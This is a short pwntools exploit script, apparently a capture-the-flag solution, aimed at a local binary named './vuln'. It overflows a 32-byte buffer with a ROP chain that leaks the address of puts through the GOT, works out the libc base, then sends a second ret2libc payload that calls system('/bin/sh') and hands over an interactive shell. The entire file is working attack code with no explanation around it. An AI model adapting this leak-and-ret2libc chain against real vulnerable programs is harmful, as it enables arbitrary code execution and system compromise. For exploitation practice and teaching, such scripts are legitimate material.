from pwn import *

elf = context.binary = ELF('./vuln')
libc = elf.libc

p = process()
p.recvline()

payload = flat(b'A' * 32,
          elf.plt['puts'],
          elf.sym['main'],
          elf.got['puts'])


print("| PUTS_plt: " + str(hex(elf.plt['puts'])) + " |")
print("| MAIN_sym: " + str(hex(elf.sym['main'])) + " |")
print("| PUTS_got: " + str(hex(elf.got['puts'])) + " |")
p.sendline(payload)

puts_leak = u32(p.recv(4))
print("| PUTS_LEAK: " + str(hex(puts_leak)) + " |")
p.recvlines(2)

libc.address = puts_leak - libc.sym['puts']
print("| LIBC_addr: " + str(hex(libc.address)) + " |")

payload = flat(b'A' * 32,
          libc.sym['system'],
          libc.sym['exit'],
          next(libc.search(b'/bin/sh\x00')))

p.sendline(payload)
p.interactive()
